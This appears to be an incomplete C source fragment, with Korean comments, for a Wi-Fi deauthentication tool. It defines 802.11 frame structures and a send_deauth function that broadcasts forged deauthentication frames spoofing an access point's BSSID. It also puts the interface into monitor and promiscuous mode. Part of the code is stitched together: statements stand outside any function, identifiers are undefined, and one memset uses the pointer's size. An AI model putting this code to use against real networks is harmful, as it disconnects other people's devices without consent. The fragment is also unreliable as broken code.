#include <stdio.h>
#include <stdlib.h>
#include <linux/wireless.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <stdint.h>

/*
radiotap hdr는 리틀 엔디안


 설정


 수신시
 recv 함수 사용 =< radiotap 헤더 부터 수신

*/

struct radiotap_hdr {
	uint8_t  version;
	uint8_t  pad;
	uint16_t len;
	uint32_t present;
} __attribute__((__packed__));

struct sequence_control {
	uint16_t fragment:4;
	uint16_t sequence:12;
} __attribute__((__packed__));

struct frame_control {
	uint8_t protocol_version:2;
	uint8_t type:2;
	uint8_t subtype:4;
	uint8_t to_ds:1;
	uint8_t from_ds:1;
	uint8_t more_frag:1;
	uint8_t retry:1;
	uint8_t pwr_mgt:1;
	uint8_t more_data:1;
	uint8_t protected_frame:1;
	uint8_t order:1;
} __attribute__((__packed__));

struct mgmt_frame {
	struct frame_control fc;
	uint16_t duration;
	uint8_t  dest_mac[IFHWADDRLEN];
	uint8_t  src_mac[IFHWADDRLEN];
	uint8_t  bssid[IFHWADDRLEN];
	struct sequence_control sc;
	uint8_t  frame_body[];
} __attribute__((__packed__));


//화면 지우기 함수
void clear_scr() {
	printf("\033[2J\033[1;1H");
	fflush(stdout);
}

int send_deauth(struct iw_dev *dev, struct access_point *ap) {
	struct mgmt_frame *deauth;
	uint16_t *reason;
	ssize_t r;

	deauth = malloc(sizeof(*deauth) + sizeof(*reason));
	if (deauth == NULL)
		return_error("malloc");

	memset(deauth, 0, sizeof(deauth));
	deauth->fc.subtype = FRAME_CONTROL_SUBTYPE_DEAUTH; //12
	/* broadcast mac (ff:ff:ff:ff:ff:ff) */
	memset(deauth->dest_mac, '\xff', IFHWADDRLEN);
	memcpy(deauth->src_mac, ap->info.bssid, IFHWADDRLEN);
	memcpy(deauth->bssid, ap->info.bssid, IFHWADDRLEN);
	reason = (uint16_t*)&deauth->frame_body;
	/* reason 7: Class 3 frame received from nonassociated STA */
	*reason = 7;

	/* send deauth */
	deauth->sc.sequence = ap->sequence++;
	ap->sequence %= 4096;
	do {
		r = iw_write(dev, deauth, sizeof(*deauth) + sizeof(*reason));
	} while (r == 0);
	if (r < 0) {
		free(deauth);
		return r;
	}

	free(deauth);

	return 0;
}


/* save current interface flags */
	memset(&dev->old_flags, 0, sizeof(dev->old_flags));
	strncpy(dev->old_flags.ifr_name, dev->ifname, sizeof(dev->old_flags.ifr_name)-1);
	if (ioctl(fd, SIOCGIFFLAGS, &dev->old_flags) < 0) {
		dev->old_flags.ifr_name[0] = '\0';
		return_error("ioctl(SIOCGIFFLAGS)");
	}

	/* save current interface mode */
	memset(&dev->old_mode, 0, sizeof(dev->old_mode));
	strncpy(dev->old_mode.ifr_name, dev->ifname, sizeof(dev->old_mode.ifr_name)-1);
	if (ioctl(fd, SIOCGIWMODE, &dev->old_mode) < 0) {
		dev->old_mode.ifr_name[0] = '\0';
		return_error("ioctl(SIOCGIWMODE)");
	}

	/* set interface down (ifr_flags = 0) */
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, dev->ifname, sizeof(ifr.ifr_name)-1);
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
		return_error("ioctl(SIOCSIFFLAGS)");

	/* set monitor mode */
	memset(&iwr, 0, sizeof(iwr));
	strncpy(iwr.ifr_name, dev->ifname, sizeof(iwr.ifr_name)-1);
	iwr.u.mode = IW_MODE_MONITOR;
	if (ioctl(fd, SIOCSIWMODE, &iwr) < 0)
		return_error("ioctl(SIOCSIWMODE)");

	/* set interface up, broadcast and running */
	ifr.ifr_flags = IFF_UP | IFF_BROADCAST | IFF_RUNNING;
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
		return_error("ioctl(SIOCSIFFLAGS)");

	/* get interface index */
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		return_error("ioctl(SIOCGIFINDEX)");
	dev->ifindex = ifr.ifr_ifindex;


    /* set fd_in in promiscuous mode */
	memset(&mreq, 0, sizeof(mreq));
	mreq.mr_ifindex = dev->ifindex;
	mreq.mr_type = PACKET_MR_PROMISC;
	if (setsockopt(dev->fd_in, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mreq, sizeof(mreq)) < 0)
		return_error("setsockopt(PACKET_MR_PROMISC)");
